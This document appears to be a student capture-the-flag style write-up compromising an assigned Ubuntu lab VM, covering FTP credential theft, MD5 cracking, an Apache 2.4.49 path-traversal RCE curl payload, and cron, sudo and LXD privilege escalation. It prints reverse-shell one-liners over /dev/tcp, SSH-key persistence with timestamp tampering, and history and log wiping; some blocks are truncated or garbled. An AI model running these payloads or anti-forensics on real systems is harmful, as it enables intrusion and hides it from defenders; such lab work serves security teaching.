# Troubleshooting
As we tried connecting to the `.ova` we were provided, we would not be able to locate the machine, despite attempting to scan every single host of our network interface using nmap
```sh
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sV -O -A 192.168.1.0/24
```
Even by trying to locate the machine itself by checking our ARP table, as its directly connected to us:
```sh
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ arp 
```
Which is very odd, as the machine should have obtained an ip address from the DHCP service...

However, after a while, we figured out that the machine *does* in fact have an ip assigned to it: by booting the machine in recovery mode and enabling the `root` console, we in fact found out that in `/etc/netplan` the machine is set up with a static ip `10.0.2.15`, so *without* DHCP, which goes against the requirements of the assignment.
![](images/netplan_trouble.png)
What we did after is removing every file under `/etc/netplan` and then creating a new file `/etc/rc.local` to enable DHCP with following content
```sh
#!/bin/bash
dhclient
exit 0
```
To which we gave `rwx` permissions to root and `r-x` to everyone else
```sh
chmod 755 /etc/rc.local
``` 
Finally, we enabled and restarted the service to save the configuration (may take a while):
```sh
systemctl enable rc-local
systemctl restart rc-local
```
We did **not** tamper with the machine in any other way while in recovery mode, we just needed to perform the above to actually begin with the assignment.

# Scanning and enumeration
We've started from a very quick `nmap` which revealed the following output:

```sh
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sV -A -O 192.168.56.2

- **SSH** on port 22 
- **Apache** on port 8080 (a webserver)

# Foothold
Let's try establishing foothold by leveraging each path individually. We have color coded them to what we thought the paths were like

## ðŸŸ¢ via FTP
As we have already said, above FTP allows for anonymous login, so let's do that:
```sh
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ ftp 192.168.56.2

Connected to 192.168.56.2.

331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
By executing a quick `ls`, we can notice the presence of a file named `site-credentials.txt`, which we will download 
```sh 
ftp> get site-credentials.txt
```
![](images/ftp_login.png)

The file, which landed on `/home/kali`, reports the following:

```txt
â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads]
â””â”€$ cat site-credentials.txt 

In case you forget the credentials to upload the files on the website,the IT department provided me with a file containing the password. 
They mentioned a certain MD5 code.

ftp-user 37b4e2d82900d5e94b8da524fbeb33c0
```

Very conveniently, there is password hashed for `ftp-user` with MD5, which is a very unsafe hash function to employ in cryptographic appliances.

We can use our trusty `JohnTheRipper` to crack the hash (which we will put inside `crack.txt` file) using the `rockyou` wordlist:

```sh
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crack.txt 

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4

```
Could `ftp-user` be an SSH user of the target machine? Let's try it:
```sh
â”Œâ”€(kaliã‰¿kali)-[~]
â””â”€$ ssh ftp-user@192.168.56.2
    football

ftp-user@ubuntulab:~$
```
An unpriviledged shell was obtained: despite being such, we have access to juicy information, such as the mounted disks 
```sh
ftp-user@ubuntulab:~$ lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0 49.9M  1 loop /snap/snapd/18357

â””â”€sda4   8:4    0  4.2G  0 part /
sr0     11:0    1 1024M  0 rom
```
and how could we miss the `/etc/passwd` file:
```sh
...
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:114:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftp-user:x:1001:1001:,,,:/usr/local/apache24/cgi-bin/:/bin/bash
```
Where we can notice the presence of two interesting users: `ubuntu` and `lxd`

## ðŸŸ  via SSH 
Since SSH is enabled, we tried to enumerate SSH users and guess their passwords. To find the SSH username `ubuntu` we have used `-L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` and for password the command below
 ```sh
 â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]

```

## ðŸ”´ via Apache
With that version of Apache (2.4.49) misconfigured, we are able to produce a remote code execution via Path Traversal.
 ```sh
 curl -s -X POST -d "echo; bash -i >& /dev/tcp/192.168.56.3/9321 0>&1" http://192.168.56.4:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash
 ```

# Privilege escalation
Now that we've found three different ways to get access to the machine, we will show the paths we found to escalate ourselves to the almighty `root` user.

We first notice the presence of the `.bash_history` file, let's take a peek:
```sh
ftp-user@ubuntulab:~$ cat .bash_history
ls
cd ..
ls
cd ..
sl
lsv
exit
systemctl start apache2
systemctl status apache2.service
journalctl -xe
sudo journalctl -xe
exit
ls
exit
cat /etc/crontab
nano ../scripts/health_check.sh
vi ../scripts/health_check.sh
less ../scripts/health_check.sh
```
in his `/home` there are some files, maybe useful for privilege escalation later on... we'll see.
```sh
ftp-user@ubuntulab:/usr/local/apache24/cgi-bin$ ls
printenv  printenv.vbs	printenv.wsf  test-cgi
```
The story differs whether we achieved foothold with `ftp-user` or `ubuntu`
- `ftp-user` has almost no privileges at all (not a sudoer) 
- `ubuntu` is practically the `root` user with extra steps

We will show below what we've found.

## ðŸŸ¢ via Cronjob 
By checking the `crontab` file, we noticed a particular:
```sh
ftp-user@ubuntulab:/home/ubuntu$ cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Health Check Apache Server
*/1 * * * * root /usr/local/apache24/scripts/health_check.sh
```
Last line: it was set to execute the `health-check.sh` script every minute (`*/1 * * * *`) as `root`, but not only... the script in question is writeable by our current `ftp-user`

```sh
-rwxrw-rw- 1 root ftp-user 415 Apr 30 14:07 /usr/local/apache24/scripts/health_check.sh
```
This is a clear vulnerability that we can leverage to obtain privilege escalation: it was enough to inject a reverse shell onto the file, in this case by LotL - Living off the Land technique using `sh`:

 ```sh
echo "sh -i >& /dev/tcp/[attacker_ip]/[attacker_port] 0>&1" > /usr/local/apache24/scripts/health_check.sh
``` 
Then waiting 1 minute on average for the cron to execute the command and attach to ourselves on the other side on a trusty netcat listener
```sh
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -lnvp 7777
```
Since the file is executed as root, the shell will be a root shell.

## ðŸŸ  via SSH
When we talked about establishing foothold sia SSH, we managed to crack the password for the `ubuntu` user.

Well, turns out that the aforementioned user has full root privileges.

```sh
ubuntu@ubuntulab:~$ sudo -l

Matching Defaults entries for ubuntu on ubuntulab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ubuntu may run the following commands on ubuntulab:
    (ALL : ALL) ALL
```
We can `sudo` everything or actually become `root` user by doing `sudo su`, using the same password that we used for foothold (`admin@123`)
```sh
ubuntu@ubuntulab:~$ sudo su

[sudo] password for ubuntu: 
root@ubuntulab:/home/ubuntu#
```
We are aware that this is a rather trivial path, but we wanted to include it for completeness nontheless, as it's related to the SSH foothold path.

## ðŸ”´ via LXD
We could exploit `lxd`, mounting the file system with `root` privileges, which requires to be `sudoer`.

Now, `ftp-user` is not a sudoer, but `ubuntu` is, therefore we wanted to include this path given the presence of `lxd` within the machine.

```sh
ubuntu@ubuntulab:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
ubuntu@ubuntulab:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
ubuntu@ubuntulab:~$ lxc start test
ubuntu@ubuntulab:~$ lxc exec test bash

root@test:~# 
```
# Persistence
We decided that to be persistent in the machine we would use the ssh public key authentication. In our machines we generated the ssh keys
```sh
ssh-keygen
```
Then we transfered the public key `id_rsa.pub` into the machine and then we added the content of it into the `authorized_keys` file
```sh
cat id_rsa.pub > authorized_keys
```
In our machines we changed the permission of the private key `id_rsa` to be `600`
```sh
chmod 600 id_rsa
```
And now we can login via `ssh` into the `root` account without needing the password and whenever we want.
One thing we did to cover our traces was to change the creation date of the public key, so that it would not be easily detected. This can be done with the following command.
```sh
touch -t YYYYMMDDhhmm id_rsa.pub
```
# Clearing the tracks
## Removing bash histories
After we gained access and installed the `ssh` keys, we started to clear our traces. We started by removing all the `.bash_history` from all the users so that all the commands we issued will not be seen.
```sh
rm /ftp-user/.bash_history
rm /ubuntu/.bash_history
rm /root/.bash_history
```
## Clearing the logs
We then cleared all the logs from the system. The logs are stored in `/var/log` and are divided by categories. We decided not to remove the files entirely, but to just empty them out.
```sh
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/cron.log
truncate -s 0 /var/log/httpd
```
